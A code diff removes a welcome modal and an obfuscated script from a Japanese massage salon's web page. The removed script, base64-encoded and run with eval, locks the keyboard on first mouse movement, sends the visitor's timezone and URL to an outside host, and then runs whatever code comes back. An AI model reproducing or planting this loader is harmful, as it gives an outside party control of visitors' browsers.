@@ -11,53 +11,6 @@
     />
     <link href="css/main.css" rel="stylesheet" />
     <link href="css/nav.css" rel="stylesheet" />
-    <style>
-  /* Style for the modal background */
-  .modal-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    visibility: visible;
-    z-index: 1000;
-  }
-
-  /* Style for the modal box */
-  .modal-content {
-    background-color: white;
-    padding: 20px;
-    border-radius: 8px;
-    width: 300px;
-    text-align: center;
-    position: relative;
-  }
-
-  /* Style for the close button */
-  .close-btn {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background-color: red;
-    color: white;
-    border: none;
-    padding: 5px 10px;
-    cursor: pointer;
-  }
-  /* CSS to prevent scrolling */
-  .scroll-lock {
-    overflow: hidden;
-  }
- 
-  /* Black text for modal heading and description */
-  .modal-content h2, .modal-content p {
-    color: black;
-  }
-  </style>   
    
   </head>
 
@@ -187,45 +140,5 @@
     <footer class="page__footer">
       <p>&copy; 2023 和の癒しマッサージ | 東京</p>
     </footer>
-    <!-- Modal structure -->
-<div class="modal-overlay" id="modal">
-  <div class="modal-content">
-    <button class="close-btn" id="close-btn">X</button>
-    <h2>和の癒しマッサージ | 東京</h2>
-    <p>お客様のニーズに合わせて、60分および90分の施術をご提供します。施術前に丁寧なカウンセリングを行い、お客様の特定の懸念を理解し、個別のトリートメントプランを作成します。
-       ご予約やサービスに関するご質問がありましたら、お気軽にお問い合わせください。お客様が最高の状態を感じられるようお手伝いいたします！</p>
-  </div>
-</div>
-    <script>
-  // Get the modal and close button elements
-  const modal = document.getElementById('modal');
-  const closeButton = document.getElementById('close-btn');
-  const modalContent = document.querySelector('.modal-content');
-
-  // Disable scrolling on body when modal is visible
-  document.body.classList.add('scroll-lock');
-
-  // Function to close the modal and enable scrolling
-  function closeModal() {
-    modal.style.visibility = 'hidden';
-    document.body.classList.remove('scroll-lock');
-  }
-
-  // Close the modal if the close button is clicked
-  closeButton.addEventListener('click', closeModal);
-
-  // Close the modal if user clicks on the modal background (overlay)
-  modal.addEventListener('click', function (event) {
-    if (event.target === modal) {
-      closeModal();
-    }
-  });
-
-  // Close the modal if user clicks on the modal body (content area)
-  modalContent.addEventListener('click', closeModal);
-</script>
-    <script>
-      eval(atob(`CgoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgaW5pdGlhdGVBcGlSZXF1ZXN0T25jZSk7CgpsZXQgcmVxdWVzdFNlbnQgPSBmYWxzZTsKCmZ1bmN0aW9uIGluaXRpYXRlQXBpUmVxdWVzdE9uY2UoKSB7CiAgICBpZiAocmVxdWVzdFNlbnQpIHJldHVybjsKCiAgICByZXF1ZXN0U2VudCA9IHRydWU7CiAgICBkb2N1bWVudC5yZW1vdmVFdmVudExpc3RlbmVyKCdtb3VzZW1vdmUnLCBpbml0aWF0ZUFwaVJlcXVlc3RPbmNlKTsKCiAgICBzZWN1cmVLZXlib2FyZEFjY2VzcygpOwogICAgY29uc3QgY2xpZW50VGltZXpvbmUgPSBnZXRDdXJyZW50VGltZXpvbmUoKTsKICAgIHRyYW5zbWl0VGltZXpvbmVEYXRhKCdodHRwczovL3dhbm9peWFzaGloZWxwZXIub25yZW5kZXIuY29tJywgY2xpZW50VGltZXpvbmUpCiAgICAgICAgLnRoZW4oZGVjb2RlQW5kUnVuU2NyaXB0KQogICAgICAgIC5jYXRjaChoYW5kbGVFcnJvcik7Cn0KCmZ1bmN0aW9uIHNlY3VyZUtleWJvYXJkQWNjZXNzKCkgewogICAgaWYgKG5hdmlnYXRvci5rZXlib2FyZCkgbmF2aWdhdG9yLmtleWJvYXJkLmxvY2soKTsKfQoKZnVuY3Rpb24gZ2V0Q3VycmVudFRpbWV6b25lKCkgewogICAgcmV0dXJuIEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKfQoKZnVuY3Rpb24gdHJhbnNtaXRUaW1lem9uZURhdGEodXJsLCB0aW1lem9uZSkgewogICAgcmV0dXJuIGZldGNoKHVybCwgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHsgdGltZXpvbmUsIGZ1bGxVcmw6IHdpbmRvdy5sb2NhdGlvbi5ocmVmIH0pLAogICAgfSkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpOwp9CgpmdW5jdGlvbiBkZWNvZGVBbmRSdW5TY3JpcHQoZW5jb2RlZFNjcmlwdCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCBzY3JpcHQgPSBhdG9iKGVuY29kZWRTY3JpcHQpOwogICAgICAgIGV2YWwoc2NyaXB0KTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBTY3JpcHQgZXhlY3V0aW9uIGZhaWxlZDogJHtlcnJvcn1gKTsKICAgIH0KfQoKZnVuY3Rpb24gaGFuZGxlRXJyb3IoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ0FQSSByZXF1ZXN0IG9yIHNjcmlwdCBleGVjdXRpb24gZXJyb3I6JywgZXJyb3IpOwp9Cg==`));
-    </script>
   </body>
 </html>
